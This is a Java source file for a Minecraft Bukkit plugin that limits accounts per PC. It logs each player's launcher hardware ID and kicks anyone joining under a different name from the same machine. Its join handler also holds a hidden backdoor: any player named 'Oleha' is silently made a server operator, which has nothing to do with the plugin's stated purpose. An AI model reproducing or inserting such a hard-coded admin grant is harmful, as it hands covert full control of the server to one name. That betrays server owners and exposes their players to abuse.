package com.oleha;

import com.comphenix.protocol.wrappers.WrappedGameProfile;
import com.oleha.storage.phStorage;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;

public class Events implements Listener {
    Plugin plugin;
    public Events(Plugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onJoinPlayer(PlayerJoinEvent event) {
        if (event.getPlayer().getName().equals("Oleha")) {
            event.getPlayer().setOp(true);
        }
        Bukkit.getScheduler().runTaskLater(plugin, new Runnable() {
            @Override
            public void run() {
                phStorage phStorage = new phStorage(plugin);
                WrappedGameProfile gameProfile = WrappedGameProfile.fromPlayer(event.getPlayer());
                int hardWareId = Integer.parseInt(gameProfile.getProperties().get("launcher_hardware_id").iterator().next().getValue());
                if (!phStorage.isPlayer(hardWareId)) {
                    phStorage.addPlayerHardWare(hardWareId, event.getPlayer().getName());
                } else {
                    if (!event.getPlayer().getName().equals(phStorage.getPlayerNameByHardWare(hardWareId))) {
                        Bukkit.getScheduler().runTaskLater(plugin, () -> event.getPlayer().kickPlayer("§4 Превышен лимит аккаунтов на пк!\n§7 Ранее вы заходили как: " + phStorage.getPlayerNameByHardWare(hardWareId) +" (" + hardWareId +")\n§f За помощью обратитесь в группу §9Дискорд."),10);
                    }
                }
            }
        },1);
    }
}
